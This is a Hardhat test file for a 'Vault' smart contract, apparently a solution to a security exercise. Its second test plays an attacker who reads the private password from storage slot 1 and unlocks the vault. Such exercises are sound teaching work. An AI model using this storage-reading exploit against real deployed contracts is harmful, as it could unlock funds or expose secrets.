const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Vault", () => {
  before(async function () {
    this.VaultFactory = await ethers.getContractFactory("Vault");
  });

  beforeEach(async function () {
    this.vaultContract = await this.VaultFactory.deploy(
      ethers.utils.formatBytes32String("secretpassword")
    );
    await this.vaultContract.deployed();
  });

  it("Initially vault should be locked", async function () {
    expect(await this.vaultContract.locked()).to.equal(true);
  });

  it("Attacker should be able to unlock the vault", async function () {
    //connect with the attacker account
    [, attacker] = await ethers.getSigners();
    this.vaultContract = await this.vaultContract.connect(attacker);
    //get the password from storage
    const password = await ethers.provider.getStorageAt(
      this.vaultContract.address,
      1
    );
    // unlock the vault
    await this.vaultContract.unlock(password);
    //check if unlocked
    expect(await this.vaultContract.locked()).to.equal(false);
  });
});
